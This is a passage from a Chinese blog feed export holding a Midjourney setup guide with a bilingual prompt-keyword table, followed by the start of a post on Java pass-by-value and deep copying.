rel="noopener">https://www.midjourney.com/(opens new window)</a></p><p>点击 “<strong>Join the Beta</strong>”</p><p><img src="/img/ai/Midjourney0.png" alt=""></p><p>输入一个昵称</p><p><img src="/img/ai/Midjourney1.png" alt=""></p><p>输入邮箱和密码，点击认证账号</p><p><img src="/img/ai/Midjourney2.png" alt=""></p><p>收取邮箱验证，激活即可</p><h3 id="激活Midjourney"><a href="#激活Midjourney" class="headerlink" title="激活Midjourney"></a>激活Midjourney</h3><h4 id="1-新建自己的服务器"><a href="#1-新建自己的服务器" class="headerlink" title="1.新建自己的服务器"></a>1.新建自己的服务器</h4><p>Midjourney是以bot插件在房间进行对话式使用的，有点像企业微信或钉钉机器人，有很多公共房间也有Midjourney插件，不过由于人太多，你跟bot的对话很容易被刷屏。</p><p>所以建一个只有你和bot的服务器，点击左侧+号</p><p><img src="/img/ai/Midjourney3.png" alt=""></p><p>选择”亲自创建</p><p><img src="/img/ai/Midjourney4.png" alt=""></p><p>选择仅供我和我的朋友使用</p><p><img src="/img/ai/Midjourney5.png" alt=""></p><p>创建服务器</p><p><img src="/img/ai/Midjourney6.png" alt=""></p><p>新建了服务器是无法直接使用的，还需要把Midjourney的机器人添加到你的服务器里面来。</p><p><img src="/img/ai/Midjourney7.png" alt=""></p><p><img src="/img/ai/Midjourney8.png" alt=""></p><p>选择你的服务器</p><p><img src="/img/ai/Midjourney9.png" alt=""></p><p>授权并验证</p><p><img src="/img/ai/Midjourney10.png" alt=""></p><p>回到你的服务器,Midjourney机器人就添加到你的房间了</p><p><img src="/img/ai/Midjourney11.png" alt=""></p><h4 id="2-开通Midjourney订阅"><a href="#2-开通Midjourney订阅" class="headerlink" title="2.开通Midjourney订阅"></a>2.开通Midjourney订阅</h4><p>Midjourney的免费计划在3月28号已经取消，目前只有开通订阅才能使用</p><p>开通订阅有两种方式：</p><ul><li>淘宝代充</li><li>绑定信用卡</li></ul><p>在输入框向bot发送<code>/subscribe</code>指令就会提示开通订阅了</p><p><img src="/img/ai/Midjourney12.png" alt=""></p><p>同意协议</p><p><img src="/img/ai/Midjourney13.png" alt=""></p><p>打开订阅链接</p><p><img src="/img/ai/Midjourney14.png" alt=""></p><p><img src="/img/ai/Midjourney15.png" alt=""></p><p><img src="/img/ai/Midjourney16.png" alt=""></p><p>好了，现在你可以选择自己用信用卡订阅或者把这个订阅链接复制然后上找淘宝代充了（关键词：Midjourney）</p><p><strong>订阅套餐说明：</strong></p><ul><li>基础计划：限制200次生成，选择年付96美元或月付10美元/月</li><li>标准计划：无限制relax生成，15小时fast生成，可选年付288美元或月付30美元</li><li>Pro计划：无限制relax生成，30小时fast生成，可选年付576美元或月付50美元</li></ul><p>relax模式跟fast模式区别是生成的时间长短，在fast模式是马上开始生成，relax模式是进入平台生成队列，需要等待</p><p>ps：小编今天在淘宝代充用60块开通10美元基础版，实在没想明白这个价格商家是怎么赚钱的？</p><h4 id="Let’s-Rock"><a href="#Let’s-Rock" class="headerlink" title="Let’s Rock!"></a>Let’s Rock!</h4><h5 id="3-1用关键字生成图像"><a href="#3-1用关键字生成图像" class="headerlink" title="3.1用关键字生成图像"></a>3.1用关键字生成图像</h5><p>现在可以在Midjourney中开始生成绘画，在输入框输入<code>/</code> 唤醒提示，使用imagine指令</p><p><img src="/img/ai/Midjourney17.png" alt=""></p><p>会出现提示框，输入你要生成的英文关键字,如生成一个星球大战吉卜力风格的猫咪的图片输入：<code>A cat , in the style of Star Wars,The Force,Ghibli</code>，然后回车</p><p>英文一般的同学可以使用翻译软件把中文关键词翻译出来再输入（<a href="https://translate.google.com/" target="_blank" rel="noopener">谷歌翻译 (opens new window)</a>,<a href="https://www.deepl.com/translator" target="_blank" rel="noopener">DeepL翻译 (opens new window)</a>）</p><p><img src="/img/ai/Midjourney18.png" alt=""></p><p>生成效果还不错，星战猫咪</p><p><img src="/img/ai/Midjourney19.png" alt=""></p><p>可以看到图像底部有三组可操作按钮，他们依次功能为：</p><ul><li>“U”升档图像，对数字对应的图像输出更大更细节的图像；</li><li>“V”创建变体，以数字对应图像的风格和构图追加细节再生成新的四张图像；</li><li>“重做”按钮，以当前关键词再输出一份四宫图图像；</li></ul><p>如果对输出的图像不满意，可以点“重做”按钮再输出一份，或者修改关键词输出图像。遇到觉得比较满意的通过“V”延展，最终确定图像后“U”输出大图。</p><p>点击U1升档第一个猫咪，增加了许多细节</p><p><img src="/img/ai/Midjourney20.png" alt=""></p><h5 id="3-2通过喂图更精准生成"><a href="#3-2通过喂图更精准生成" class="headerlink" title="3.2通过喂图更精准生成"></a>3.2通过喂图更精准生成</h5><p>如果只用关键字无法生成所需要的图片，可以通过提供参考图，让Mj更加精准的生成</p><p>首选我们需要把参考图上传到平台，点击输入框左侧“+”符号，选择“上传文件”选择本地参考图片，“回车”上传。</p><p><img src="/img/ai/Midjourney21.png" alt=""></p><p>上传后，右键点击图片，复制图片的链接</p><p><img src="/img/ai/Midjourney22.png" alt=""></p><p>喂图生成提示词格式为：图片链接+空格+关键词</p><p>参考图为一个在竹筐的猫咪，生成一个关键词为：<code>猫咪，草地，黑夜，吉卜力风格</code></p><p><img src="/img/ai/Midjourney23.png" alt=""></p><p>可以看到我们能够通过喂图和关键词描述的操作，让AI绘画更加具象了。</p><p><img src="/img/ai/Midjourney24.png" alt=""></p><p>可以通过进一步补充关键字：主体、动作、场景、视角、光照、风格、材质等做输入来控制生成的结果</p><p>各位小伙伴可以自行探索</p><h3 id="Midjourney提示词列表"><a href="#Midjourney提示词列表" class="headerlink" title="Midjourney提示词列表"></a>Midjourney提示词列表</h3><h4 id="风格"><a href="#风格" class="headerlink" title="风格"></a>风格</h4><div class="table-container"><table><thead><tr><th>英文提示词</th><th>中文</th></tr></thead><tbody><tr><td>Tradition Chinese Ink Painting style</td><td>东方山水画</td></tr><tr><td>Japanese Ukiyo-e</td><td>浮世绘</td></tr><tr><td>Japanese comics/ manga</td><td>日本漫画风格</td></tr><tr><td>stock illustration style</td><td>童话故事书插图风格</td></tr><tr><td>CGSociety</td><td>梦工厂动西风格</td></tr><tr><td>DreamWorks Pictures</td><td>梦工厂影业</td></tr><tr><td>Pixar</td><td>皮克斯</td></tr><tr><td>Disney</td><td>迪士尼</td></tr><tr><td>Fashion</td><td>时尚</td></tr><tr><td>poster ofapanese graphic design</td><td>日本海报风格</td></tr><tr><td>90s video game</td><td>90年代电视游戏</td></tr><tr><td>french art</td><td>法国艺术</td></tr><tr><td>Bauhaus</td><td>包豪斯</td></tr><tr><td>Anime</td><td>日本动画片</td></tr><tr><td>Pixel Art</td><td>像素画</td></tr><tr><td>Vintage</td><td>古典风，18-19世纪</td></tr><tr><td>Pulp Noir</td><td>黑白电影时期</td></tr><tr><td>Country style</td><td>乡村风格</td></tr><tr><td>Abstract</td><td>抽象风</td></tr><tr><td>risograph</td><td>riso印刷风</td></tr><tr><td>Graphic</td><td>设计风</td></tr><tr><td>ink render</td><td>墨水渲染</td></tr><tr><td>Ethnic Art</td><td>民族艺术</td></tr><tr><td>retro dark vintage</td><td>复古黑暗</td></tr><tr><td>Tradition Chinese Ink Painting style</td><td>国风</td></tr><tr><td>Ccyberpunk</td><td>赛博朋克</td></tr><tr><td>art deco</td><td>装饰艺术</td></tr><tr><td>Future Machinery</td><td>未来机械</td></tr><tr><td>Steampunk</td><td>蒸汽朋克</td></tr><tr><td>film photography</td><td>电影摄影风格</td></tr><tr><td>concept art</td><td>概念艺术</td></tr><tr><td>montage</td><td>剪辑</td></tr><tr><td>full details</td><td>充满细节</td></tr><tr><td>Gothic gloomy</td><td>哥特式黑暗</td></tr><tr><td>realism</td><td>写实主义</td></tr><tr><td>black and white</td><td>黑白</td></tr><tr><td>Unity Creations</td><td>统一创作</td></tr><tr><td>Baroque</td><td>巴洛克时期</td></tr><tr><td>Impressionism</td><td>印象派</td></tr><tr><td>Art Nouveau</td><td>新艺术风格</td></tr><tr><td>Rococo</td><td>新艺术</td></tr><tr><td>Renaissance</td><td>文艺复兴</td></tr><tr><td>Fauvism</td><td>野兽派</td></tr><tr><td>Cubism</td><td>立体派</td></tr><tr><td>Abstract Art</td><td>抽象表现主义</td></tr><tr><td>Surrealism</td><td>超现实主义</td></tr><tr><td>OP Art /Optical Art</td><td>欧普艺术/光效应艺术</td></tr><tr><td>Victorian</td><td>维多利亚时代</td></tr><tr><td>futuristic</td><td>未来主义</td></tr><tr><td>Minimalist</td><td>极简主义</td></tr><tr><td>brutalist</td><td>粗犷主义</td></tr><tr><td>Constructivist</td><td>建构主义</td></tr><tr><td>botw</td><td>旷野之息</td></tr><tr><td>Warframe</td><td>星际战甲</td></tr><tr><td>Pokemon</td><td>宝可梦</td></tr><tr><td>APEX</td><td>Apex英雄</td></tr><tr><td>The Elder Scrolls</td><td>上古卷轴</td></tr><tr><td>From Software</td><td>魂系游戏</td></tr><tr><td>Detroit: Become Human</td><td>底特律：变人</td></tr><tr><td>AFK Arena</td><td>剑与远征</td></tr><tr><td>Cookie Run: Kingdom</td><td>跑跑姜饼人</td></tr><tr><td>League of legends</td><td>英雄联盟</td></tr><tr><td>ojo’s bizarre adventure</td><td>Jojo的奇妙冒险</td></tr><tr><td>Makoto Shinkai</td><td>新海诚</td></tr><tr><td>Soejima Shigenori</td><td>副岛成记</td></tr><tr><td>sci-fi punk</td><td>科幻朋克</td></tr><tr><td>knolling</td><td>拆分</td></tr><tr><td>3D printing/3d printed</td><td>层积式样3D打印</td></tr><tr><td>Yamada Akihiro</td><td>山田章博</td></tr><tr><td>Munashichi</td><td>六七质</td></tr><tr><td>Watercolor children’s illustration</td><td>水彩儿童插画</td></tr><tr><td>Ghibli Studio</td><td>吉卜力风格</td></tr><tr><td>Stained glass window</td><td>彩色玻璃窗</td></tr><tr><td>ink illustration</td><td>水墨插图</td></tr><tr><td>Miyazaki Hayao style</td><td>宫崎骏风格</td></tr><tr><td>Vincent Van Gogh</td><td>梵高</td></tr><tr><td>Leonardo Da Vinci</td><td>达芬奇</td></tr><tr><td>manga</td><td>漫画</td></tr><tr><td>pointillism</td><td>点彩派</td></tr><tr><td>Claude Monet</td><td>克劳德莫奈</td></tr><tr><td>quilted art</td><td>绗缝艺术</td></tr><tr><td>partial anatomy</td><td>局部解剖</td></tr><tr><td>color ink on paper</td><td>彩墨纸本</td></tr><tr><td>doodle</td><td>涂鸦</td></tr><tr><td>Voynich manuscript</td><td>伏尼契手稿</td></tr><tr><td>book page</td><td>书页</td></tr><tr><td>realistic</td><td>真实的</td></tr><tr><td>3D</td><td>3D风格</td></tr><tr><td>sophisticated</td><td>复杂的</td></tr><tr><td>photoreal</td><td>真实感</td></tr><tr><td>national geographic</td><td>国家地理</td></tr><tr><td>hyperrealism</td><td>超写实主义</td></tr><tr><td>cinematic</td><td>电影般的</td></tr><tr><td>architectural sketching</td><td>建筑素描</td></tr><tr><td>symmetrical portrait</td><td>对称肖像</td></tr><tr><td>clear facial features</td><td>清晰的面部特征</td></tr><tr><td>interior design</td><td>室内设计</td></tr><tr><td>weapon design</td><td>武器设计</td></tr><tr><td>subsurface scattering</td><td>次表面散射</td></tr><tr><td>Game scene graph</td><td>游戏场景图</td></tr><tr><td>character concept art</td><td>角色概念艺术</td></tr><tr><td>character design</td><td>角色设计</td></tr><tr><td>plane vector painting</td><td>平面适量插画</td></tr></tbody></table></div><h4 id="视角"><a href="#视角" class="headerlink" title="视角"></a>视角</h4><div class="table-container"><table><thead><tr><th>英文提示词</th><th>中文</th></tr></thead><tbody><tr><td>Top view</td><td>顶视图</td></tr><tr><td>tilt-shift</td><td>移轴摄影</td></tr><tr><td>satellite view</td><td>卫星视图</td></tr><tr><td>Bottom view</td><td>底视图</td></tr><tr><td>front, side, rear view</td><td>前视图、侧视图、后视图</td></tr><tr><td>product view</td><td>产品视图</td></tr><tr><td>extreme closeup view</td><td>极端特写视图</td></tr><tr><td>look up</td><td>仰视</td></tr><tr><td>first-person view</td><td>第一人称视角</td></tr><tr><td>isometric view</td><td>等距视图</td></tr><tr><td>closeup view</td><td>特写视图</td></tr><tr><td>high angle view</td><td>高角度视图</td></tr><tr><td>microscopic view</td><td>微观</td></tr><tr><td>super side angle</td><td>超侧角</td></tr><tr><td>third-person perspective</td><td>第三人称视角</td></tr><tr><td>Aerial view</td><td>乌瞰图</td></tr><tr><td>two-point perspective</td><td>两点透视</td></tr><tr><td>Three-point perspective</td><td>三点透视</td></tr><tr><td>portrait</td><td>肖像</td></tr><tr><td>Elevation perspective</td><td>立面透视</td></tr><tr><td>ultra wide shot</td><td>超广角镜头</td></tr><tr><td>headshot</td><td>爆头</td></tr><tr><td>a cross-section view of (a walnut)</td><td>（核桃）的横截面图</td></tr><tr><td>cinematic shot</td><td>电影镜头</td></tr><tr><td>in focus</td><td>焦点对准</td></tr><tr><td>depth of field (dof)</td><td>景深(dof)</td></tr><tr><td>Wide- angle view</td><td>广角镜头</td></tr><tr><td>canon 5d,1fujifilm xt100,Sony alpha</td><td>相机型号 焦段 光圈</td></tr><tr><td>Close-Up(CU)</td><td>特写</td></tr><tr><td>Medium Close-Up(MCU)</td><td>中特写</td></tr><tr><td>Medium Shot(MS)</td><td>中景</td></tr><tr><td>Medium Long Shot(MLS)</td><td>中远暴</td></tr><tr><td>Long Shot(LS)</td><td>远景</td></tr><tr><td>over the shoulder shot</td><td>过肩景</td></tr><tr><td>loose shot</td><td>松散景</td></tr><tr><td>tight shot</td><td>近距离景</td></tr><tr><td>two shot(2S), three shot(3S), group shot(GS)</td><td>两景(25)、三景(3S)、群景（GS）</td></tr><tr><td>scenery shot</td><td>风景照，空镜，只有背景没有人</td></tr><tr><td>bokeh</td><td>背景虛化</td></tr><tr><td>foreground</td><td>前景</td></tr><tr><td>background</td><td>背景</td></tr><tr><td>Detail Shot(ECU)</td><td>细节镜头(ECU)</td></tr><tr><td>Face Shot (VCU)</td><td>面部拍摄(VCU)</td></tr><tr><td>Knee Shot(KS)</td><td>滕景(KS)</td></tr><tr><td>Full Length Shot(FLS)</td><td>全身照(FLS</td></tr><tr><td>Detail Shot(ECU)</td><td>大特写</td></tr><tr><td>Chest Shot(McU)</td><td>胸部以上</td></tr><tr><td>Waist Shot(WS)</td><td>腰部以上</td></tr><tr><td>Knee Shot(KS)</td><td>滕盖以上</td></tr><tr><td>Full Length Shot(FLS)</td><td>全身</td></tr><tr><td>Long Shot(LS)</td><td>人占3/4</td></tr><tr><td>Extra Long Shot(ELS)</td><td>人在远方</td></tr><tr><td>Big Close-Up(BCU)</td><td>头部以上</td></tr><tr><td>Face Shot (VCU)</td><td>脸部特写</td></tr></tbody></table></div><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><div class="table-container"><table><thead><tr><th>英文提示词</th><th>中文</th></tr></thead><tbody><tr><td>dystopia,anti-utopia</td><td>反乌托邦</td></tr><tr><td>fantasy</td><td>幻想</td></tr><tr><td>classroom</td><td>教室</td></tr><tr><td>whimsically</td><td>异想天开</td></tr><tr><td>bedroom</td><td>卧室</td></tr><tr><td>forest</td><td>森林</td></tr><tr><td>ruins</td><td>废墟</td></tr><tr><td>city</td><td>城市</td></tr><tr><td>deserted city buildings</td><td>废弃城市建筑群</td></tr><tr><td>near future city</td><td>近未来都市</td></tr><tr><td>street scenery</td><td>街景</td></tr><tr><td>Alchemy Laboratory</td><td>炼金室</td></tr><tr><td>universe l cosmos</td><td>宇宙</td></tr><tr><td>rain</td><td>雨天</td></tr><tr><td>In the morning mist</td><td>在晨雾中</td></tr><tr><td>full of sunlight</td><td>充满阳光</td></tr><tr><td>galaxy</td><td>银河</td></tr><tr><td>dungeon</td><td>黑暗地牢</td></tr><tr><td>nebula</td><td>星云</td></tr><tr><td>mad max</td><td>疯狂麦斯沙地风格</td></tr><tr><td>Hanging Gardens of Babylon</td><td>巴比伦空中花园</td></tr><tr><td>meadow</td><td>草原草地</td></tr><tr><td>overgrown nature</td><td>杂草丛生的</td></tr><tr><td>post apocalyptic</td><td>后启示录、末日后</td></tr><tr><td>growing, alive</td><td>有机的，可生长的</td></tr><tr><td>liminal space</td><td>极小空间</td></tr><tr><td>mist</td><td>雱</td></tr><tr><td>Castle in the Sky</td><td>天空之城</td></tr></tbody></table></div><h4 id="光照"><a href="#光照" class="headerlink" title="光照"></a>光照</h4><div class="table-container"><table><thead><tr><th>英文提示词</th><th>中文</th></tr></thead><tbody><tr><td>volumetric lighting</td><td>体积照明</td></tr><tr><td>cold light</td><td>冷光</td></tr><tr><td>mood lighting</td><td>氛围光</td></tr><tr><td>bright</td><td>明亮的</td></tr><tr><td>Soft illuminaotion/ soft lights</td><td>全局柔光/局部柔光</td></tr><tr><td>fluorescent lighting</td><td>荧光灯</td></tr><tr><td>rays of shimmering light/ morning light</td><td>闪光/晨光</td></tr><tr><td>top light</td><td>顶光</td></tr><tr><td>rim lights</td><td>轮廓光</td></tr><tr><td>Crepuscular Ray</td><td>云隙光，黄昏射线</td></tr><tr><td>outer space view</td><td>外太空观</td></tr><tr><td>cinematic lighting/ Dramatic lighting</td><td>电影灯光/戏剧灯光</td></tr><tr><td>bisexual lighting</td><td>双性照明</td></tr><tr><td>Rembrandt Lighting</td><td>伦勃朗照明</td></tr><tr><td>Split Lighting</td><td>分体照明</td></tr><tr><td>front lighting</td><td>前灯</td></tr><tr><td>Back lighting</td><td>背光照明</td></tr><tr><td>clean background trending</td><td>干净的背景趋势</td></tr><tr><td>rim lights</td><td>边缘灯</td></tr><tr><td>global iluminations</td><td>全局照明</td></tr><tr><td>neon cold lighting</td><td>霓虹灯冷光</td></tr><tr><td>hard lighting</td><td>强光</td></tr><tr><td>bioluminescence</td><td>生物光，萤火虫的光</td></tr></tbody></table></div><h4 id="材质"><a href="#材质" class="headerlink" title="材质"></a>材质</h4><div class="table-container"><table><thead><tr><th>英文提示词</th><th>中文</th></tr></thead><tbody><tr><td>decaying</td><td>腐朽衰败的</td></tr><tr><td>bone</td><td>骨骼状</td></tr><tr><td>wood</td><td>木头</td></tr><tr><td>glass</td><td>玻璃</td></tr><tr><td>catton</td><td>棉花</td></tr><tr><td>inen</td><td>亚麻布</td></tr><tr><td>lace</td><td>蕾丝</td></tr><tr><td>velvet</td><td>天鹅绒</td></tr><tr><td>sandstone</td><td>砂岩</td></tr><tr><td>tissue papper</td><td>薄纸巾</td></tr><tr><td>porcelain</td><td>瓷器</td></tr><tr><td>celadon</td><td>青瓷</td></tr><tr><td>cloisonne</td><td>珐琅</td></tr><tr><td>clay</td><td>粘土</td></tr></tbody></table></div><h2 id="渲染"><a href="#渲染" class="headerlink" title="#渲染"></a><a href="https://readdevdocs.com/blog/makemoney/midjourney-promte.html#渲染" target="_blank" rel="noopener">#</a>渲染</h2><div class="table-container"><table><thead><tr><th>英文提示词</th><th>中文</th></tr></thead><tbody><tr><td>Unreal Engine</td><td>虚幻引擎</td></tr><tr><td>octane render</td><td>OC遣染</td></tr><tr><td>Maxon Cinema 4D</td><td>渲染</td></tr><tr><td>architectural visualisation</td><td>建筑渲染</td></tr><tr><td>Corona Render</td><td>室内渣染</td></tr><tr><td>Quixel Megascans Render</td><td>真实感</td></tr><tr><td>V-Ray</td><td>V射线</td></tr><tr><td>3D render</td><td>3D渲染</td></tr></tbody></table></div><h4 id="媒介"><a href="#媒介" class="headerlink" title="媒介"></a>媒介</h4><div class="table-container"><table><thead><tr><th>英文提示词</th><th>中文</th></tr></thead><tbody><tr><td>iustration</td><td>插画</td></tr><tr><td>Vector</td><td>向量图</td></tr><tr><td>oil painting</td><td>油画</td></tr><tr><td>photography</td><td>摄影</td></tr><tr><td>watercolor</td><td>水彩</td></tr><tr><td>sketch</td><td>素描</td></tr><tr><td>ink painting</td><td>雕塑</td></tr><tr><td>scullpture</td><td>水墨画</td></tr><tr><td>Blockprint</td><td>印刷版画</td></tr><tr><td>Lino cut</td><td>利诺剪裁</td></tr><tr><td>manuscript</td><td>手稿</td></tr></tbody></table></div><h4 id="情绪"><a href="#情绪" class="headerlink" title="情绪"></a>情绪</h4><div class="table-container"><table><thead><tr><th>英文提示词</th><th>中文</th></tr></thead><tbody><tr><td>peaceful</td><td>和平</td></tr><tr><td>quiet</td><td>静谧的</td></tr><tr><td>mysterious</td><td>神秘的</td></tr><tr><td>sense of awe</td><td>敬畏感</td></tr><tr><td>coziness</td><td>舒适感</td></tr><tr><td>adventure</td><td>冒险的</td></tr><tr><td>sorrow</td><td>悲观，伤感</td></tr><tr><td>happy</td><td>开心的</td></tr></tbody></table></div><h4 id="随机结构"><a href="#随机结构" class="headerlink" title="随机结构"></a>随机结构</h4><div class="table-container"><table><thead><tr><th>英文提示词</th><th>中文</th></tr></thead><tbody><tr><td>bubbles</td><td>气泡状的</td></tr><tr><td>aurora borealis</td><td>极光</td></tr><tr><td>helix</td><td>螺旋体</td></tr><tr><td>waterfall</td><td>混布状</td></tr><tr><td>webs</td><td>网状</td></tr><tr><td>stalagmite</td><td>石笋状</td></tr><tr><td>fluid</td><td>流体状</td></tr><tr><td>vapour</td><td>蒸汽状</td></tr><tr><td>snowflake</td><td>雪花状</td></tr></tbody></table></div>]]></content>
      
      
      
        <tags>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>几种深拷贝方式</title>
      <link href="/2023/01/08/%E5%87%A0%E7%A7%8D%E6%B7%B1%E6%8B%B7%E8%B4%9D%E6%96%B9%E5%BC%8F/"/>
      <url>/2023/01/08/%E5%87%A0%E7%A7%8D%E6%B7%B1%E6%8B%B7%E8%B4%9D%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>由于业务代码的方法将传递的引用数据类型参数进行了修改，后续业务又需要修改前的参数，所以需要在修改前进行深拷贝保持修改前的对象。</p><h2 id="java值传递"><a href="#java值传递" class="headerlink" title="java值传递"></a>java值传递</h2><h3 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h3><p>代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestJavaPass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        TestJavaPass tj = <span class="keyword">new</span> TestJavaPass();</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">10</span>;</span><br><span class="line">        tj.pass(i);</span><br><span class="line">        System.out.println(<span class="string">"print in main, i is "</span>+i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pass</span><span class="params">(<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">        j=<span class="number">20</span>;</span><br><span class="line">        System.out.println(<span class="string">"print in pass, j is "</span>+j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print in pass, j is 20</span><br><span class="line">print in main, i is 10</span><br></pre></td></tr></table></figure><p>结论:</p><p>传入基本数据类型时，为值传递不会改变其本身</p><h3 id="引用数据类型"><a href="#引用数据类型" class="headerlink" title="引用数据类型"></a>引用数据类型</h3><h4 id="情况一，传入对象并改变其自身属性"><a href="#情况一，传入对象并改变其自身属性" class="headerlink" title="情况一，传入对象并改变其自身属性"></a>情况一，传入对象并改变其自身属性</h4><p>代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestJavaPass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        TestJavaPass tj = <span class="keyword">new</span> TestJavaPass();</span><br><span class="line"><span class="comment">//        int i=10;</span></span><br><span class="line"><span class="comment">//        tj.pass(i);</span></span><br><span class="line"><span class="comment">//        System.out.println("print in main, i is "+i);</span></span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">"hollis"</span>);</span><br><span class="line">        user.setGender(<span class="string">"Male"</span>);</span><br><span class="line">        tj.pass(user);</span><br><span class="line">        System.out.println(<span class="string">"print in main , user is "</span>+user);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pass</span><span class="params">(<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">        j=<span class="number">20</span>;</span><br><span class="line">        System.out.println(<span class="string">"print in pass, j is "</span>+j);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pass</span><span class="params">(User user)</span></span>&#123;</span><br><span class="line">        user.setName(<span class="string">"hollischuang"</span>);</span><br><span class="line">        System.out.println(<span class="string">"print in pass , user is "</span>+user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print in pass , user is User&#123;name&#x3D;&#39;hollischuang&#39;, gender&#x3D;&#39;Male&#39;&#125;</span><br><span class="line">print in main , user is User&#123;name&#x3D;&#39;hollischuang&#39;, gender&#x3D;&#39;Male&#39;&#125;</span><br></pre></td></tr></table></figure><p>结论:</p><p>传入为引用类型时，对象的属性改变，注：这种情况属于特殊的值传递，传递的是实际参数的地址的复制。</p><h4 id="情况二，传入对象的引用，不改变对象的属性"><a href="#情况二，传入对象的引用，不改变对象的属性" class="headerlink" title="情况二，传入对象的引用，不改变对象的属性"></a>情况二，传入对象的引用，不改变对象的属性</h4><p>代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestJavaPass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        TestJavaPass tj = <span class="keyword">new</span> TestJavaPass();</span><br><span class="line"><span class="comment">//        int i=10;</span></span><br><span class="line"><span class="comment">//        tj.pass(i);</span></span><br><span class="line"><span class="comment">//        System.out.println("print in main, i is "+i);</span></span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">"hollis"</span>);</span><br><span class="line">        user.setGender(<span class="string">"Male"</span>);</span><br><span class="line">        tj.pass(user);</span><br><span class="line">        System.out.println(<span class="string">"print in main , user is "</span>+user);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pass</span><span class="params">(<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">        j=<span class="number">20</span>;</span><br><span class="line">        System.out.println(<span class="string">"print in pass, j is "</span>+j);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pass</span><span class="params">(User user)</span></span>&#123;</span><br><span class="line">        user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">"hollischuang"</span>);</span><br><span class="line">        System.out.println(<span class="string">"print in pass , user is "</span>+user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print in pass , user is User&#123;name&#x3D;&#39;hollischuang&#39;, gender&#x3D;&#39;null&#39;&#125;</span><br><span class="line">print in main , user is User&#123;name&#x3D;&#39;hollis&#39;, gender&#x3D;&#39;Male&#39;&#125;</span><br></pre></td></tr></table></figure><p>结论:</p><p>方法pass中形参user首先指向main方法中的user，然后再新建user类的时候会重新指向新建的user，后续改变新建user，main方法中的user并未改变，这里是值传递，传递的是对象的引用。</p><p>java是值传递，基本数据类型传递复制的对象，引用数据类型传递其引用，如果在方法中提供了修改引用对象的方法则会修改其对象，否则不会修改</p><h3 id="几种深拷贝方式"><a href="#几种深拷贝方式" class="headerlink" 